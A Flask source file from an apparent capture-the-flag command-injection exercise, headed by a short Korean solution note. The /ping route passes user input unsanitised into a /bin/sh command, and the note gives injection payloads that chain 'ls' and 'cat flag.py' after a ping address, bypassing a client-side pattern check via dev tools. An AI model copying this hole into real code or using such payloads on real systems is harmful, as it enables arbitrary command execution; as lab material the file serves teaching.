'''
    solution..!
- input에 pattern이 걸려있으므로 dev tool을 통해서 풀어야함
- 큰 따옴표를 활용해서 파일경로 확인
    - 8.8.8.8";"ls"
- cat 명령어를 통해 flag.py 내용 확인
    - 8.8.8.8";"cat" "flag.py
'''
#!/usr/bin/env python3
import subprocess

from flask import Flask, request, render_template, redirect

#from flag import FLAG

APP = Flask(__name__)


@APP.route('/')
def index():
    return render_template('index.html')


@APP.route('/ping', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host')
        cmd = f'ping -c 3 "{host}"'
        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            return render_template('ping_result.html', data=output.decode('utf-8'))
        except subprocess.TimeoutExpired:
            return render_template('ping_result.html', data='Timeout !')
        except subprocess.CalledProcessError:
            return render_template('ping_result.html', data=f'an error occurred while executing the command. -> {cmd}')

    return render_template('ping.html')


if __name__ == '__main__':
    APP.run(host='0.0.0.0', port=8000)
